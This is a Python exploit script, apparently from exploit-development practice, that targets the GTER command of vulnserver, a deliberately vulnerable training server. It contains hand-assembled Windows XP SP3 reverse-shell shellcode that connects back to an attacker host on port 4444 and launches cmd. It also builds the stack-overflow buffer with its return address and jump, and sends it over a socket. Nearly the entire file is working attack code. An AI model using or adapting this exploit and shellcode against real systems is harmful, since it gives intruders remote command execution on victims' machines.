#!/usr/bin/python

import socket
import sys

host = "192.168.52.129"
port = 9999

#########################################
## WriTTen by:van6uard
## vulnserver GTER Exploit
## 
## Have limited space, need to spray shellcode 
## onto the stack in another function.
##
## Using Arwin the following addresses are for winxp sp3
## WSASocketA = xp sp3 71ab8b6a
## CreateProcessA = xp sp3 7c80236b
## connect = xp sp3 71ab4a07
########################################


########################################
#SOCKET WSAAPI WSASocketA(
#  int                 af,
#  int                 type,
#  int                 protocol,
#  LPWSAPROTOCOL_INFOA lpProtocolInfo,
#  GROUP               g,
#  DWORD               dwFlags
#);
########################################


## 122 byte revshell
revshell  = ""
## Open WSASocketA connection
revshell += "\x50"          # push eax
revshell += "\x5c"          # pop esp
revshell += "\x31\xc0"      # xor eax, eax
revshell += "\x50"          # push eax
revshell += "\x50"          # push eax
revshell += "\x50"          # push eax
revshell += "\x31\xdb"      # xor ebx, ebx
revshell += "\xb3\x06"      # mov bl, 6
revshell += "\x53"          # push ebx
revshell += "\x40"          # inc eax
revshell += "\x50"          # push eax
revshell += "\x40"          # inc eax
revshell += "\x50"          # push eax
revshell += "\xbb\x6a\x8b\xab\x71"   # MOV EBX,WS2_32.WSASocketA for winxp sp3
revshell += "\x31\xc0"      # xor eax, eax
revshell += "\xff\xd3"      # call ebx 
revshell += "\x96"           # xchg eax, esi

## Connect to Attacking machine @ IP 192.168.52.133 on port 4444
revshell += "\x68\xc0\xa8\x34\x85"  # push 192.168.52.133
revshell += "\x66\x68\x11\x5c"      # push 4444 
revshell += "\x31\xdb"              # xor ebx, ebx
revshell += "\x80\xc3\x02"          # add bl, 2
revshell += "\x66\x53"              # push bx
revshell += "\x89\xe2"              # mov edx, esp
revshell += "\x6a\x10"              # push 10
revshell += "\x52"                  # push edx              
revshell += "\x56"                  # push esi
revshell += "\xbb\x07\x4a\xab\x71"  # mov ebx, 0x71ab4a07 connect WinXP SP3
revshell += "\xff\xd3"              # call ebx

# Create new process 
revshell += "\xba\x63\x63\x6d\x64"  # mov edx, 0x646d6363 cmd
revshell += "\xc1\xea\x08"          # shr edx, 8
revshell += "\x52"                  # push edx
revshell += "\x89\xe1"              # mov ecx, esp
revshell += "\x31\xd2"              # xor edx, edx
revshell += "\x83\xec\x10"          # sub esp, 10 
revshell += "\x89\xe3"              # mov ebx, esp
revshell += "\x56"                  # push esi
revshell += "\x56"                  # push esi
revshell += "\x56"                  # push esi
revshell += "\x52"                  # push edx
revshell += "\x52"                  # push edx
revshell += "\x31\xc0"              # xor eax, eax
revshell += "\x40"                  # inc eax
revshell += "\xc1\xc0\x08"          # rol eax, 8
revshell += "\x50"                  # push eax
revshell += "\x52"                  # push edx
revshell += "\x52"                  # push edx
revshell += "\x52"                  # push edx
revshell += "\x52"                  # push edx
revshell += "\x52"                  # push edx
revshell += "\x52"                  # push edx
revshell += "\x52"                  # push edx
revshell += "\x52"                  # push edx
revshell += "\x52"                  # push edx
revshell += "\x52"                  # push edx
revshell += "\x31\xc0"              # xor eax, eax
revshell += "\x04\x2c"              # add al, 2c
revshell += "\x50"                  # push eax
revshell += "\x89\xe0"              # mov eax, esp
revshell += "\x53"                  # push ebx
revshell += "\x50"                  # push eax
revshell += "\x52"                  # push edx
revshell += "\x52"                  # push edx
revshell += "\x52"                  # push edx
revshell += "\x31\xc0"              # xor eax, eax
revshell += "\x40"                  # inc eax
revshell += "\x50"                  # push eax
revshell += "\x52"                  # push edx
revshell += "\x52"                  # push edx
revshell += "\x51"                  # push ecx
revshell += "\x52"                  # push edx
revshell += "\xbb\x6b\x23\x80\x7c"  # mov ebx, 0x7c80236b CreateProcessA
revshell += "\xff\xd3"              # call ebx


buf = 'GTER ' 
buf += '\x90'*29
buf += revshell
buf += 'A'*(151-29-len(revshell))
buf += '\xaf\x11\x50\x62'
buf += '\xeb\x80\x90\x90'
buf += 'D'*(300-147-4-4)


try:
    c = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    c.connect((host, port))
    c.recv(1024)
    c.send(buf + '\r\n')
    print "[+] Evil shellcode sent..."
    c.close()



except:
    print "[-] Can't send evil buffer"
    sys.exit()
